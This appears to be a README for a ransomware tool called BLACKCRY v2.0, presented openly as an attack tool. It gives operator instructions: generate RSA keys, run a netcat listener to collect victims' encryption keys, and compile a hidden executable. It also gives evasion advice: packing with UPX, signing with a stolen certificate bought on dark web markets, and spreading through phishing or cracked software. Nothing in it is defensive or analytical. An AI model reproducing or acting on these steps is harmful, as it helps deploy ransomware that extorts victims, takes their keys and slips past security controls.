# BLACKCRY-RANSOMWARE-v2.0

🔧 How to Use:

Generate RSA key pair (offline):
bash
Copy
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
Replace the public_key_data in code with your public.pem
Run a listener to receive keys:
bash
Copy
nc -lvnp 9999 > received_keys.txt
Compile with PyInstaller:
bash
Copy
pyinstaller --onefile --noconsole blackcry.py
🛡️ Evasion Tips:

Use UPX packing
Sign with stolen cert (search: certs marketplace dark web)
Deliver via phishing or cracked software

Coded By Cyber Security Engineer Mr Sabaz ali khan 

<img width="642" height="708" alt="Sabaz ali khan cyber security enginner (40)" src="https://github.com/user-attachments/assets/68218004-8aa6-4009-8d7c-39e7532b2109" />



